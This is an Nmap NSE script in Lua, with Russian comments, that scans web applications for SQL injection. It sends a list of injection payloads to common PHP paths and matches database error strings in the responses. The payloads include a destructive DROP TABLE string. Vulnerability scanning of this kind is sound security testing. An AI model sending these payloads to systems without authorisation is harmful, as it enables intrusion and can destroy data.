-- sql_injection.nse
--
-- Проверяет наличие уязвимости SQL-инъекции в веб-приложениях, отправляя специально сформированные HTTP-запросы.
--
-- Требования:
--   nmap 7.80+
--   http библиотека nmap
--
-- Автор: TeslaAI Expert
-- Лицензия: Same as Nmap

local nmap = require "nmap"
local http = require "http"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"
local table = require "table"

description = [[
Проверяет уязвимость SQL-инъекции в веб-приложениях с помощью отправки специально сформированных HTTP-запросов и анализа ответов сервера.
]]

author = "TeslaAI Expert"

license = "Same as Nmap--See https://nmap.org/book/man-legal.html"

categories = {"exploit", "vuln", "intrusive"}

portrule = shortport.http

local payloads = {
  "' OR '1'='1",
  "\" OR \"1\"=\"1",
  "'; DROP TABLE users; --",
  "' OR 1=1--",
  "' OR 1=1#",
  "' OR 1=1/*",
  "' AND SLEEP(5)--",
  "' AND 1=(SELECT COUNT(*) FROM information_schema.tables)--"
}

local function test_sql_injection(host, port)
  local vuln_paths = {}
  local paths_to_test = {"/", "/index.php", "/login.php", "/search.php", "/product.php"}

  for _, path in ipairs(paths_to_test) do
    for _, payload in ipairs(payloads) do
      local url = path .. "?id=" .. http.url.escape(payload)
      local response = http.get(host, port, url)

      if response and response.status == 200 then
        -- Анализируем ответ на наличие характерных признаков SQL-инъекции
        local body = response.body:lower()

        if string.find(body, "sql syntax") or
           string.find(body, "mysql") or
           string.find(body, "you have an error in your sql syntax") or
           string.find(body, "warning: mysql") or
           string.find(body, "unclosed quotation mark") then
          table.insert(vuln_paths, url)
          break
        end
      end
    end
  end

  return vuln_paths
end

action = function(host, port)
  local vuln = test_sql_injection(host, port)
  if #vuln == 0 then
    return "SQL-инъекция не обнаружена"
  else
    return "Обнаружена возможная SQL-инъекция по путям: " .. table.concat(vuln, ", ")
  end
end
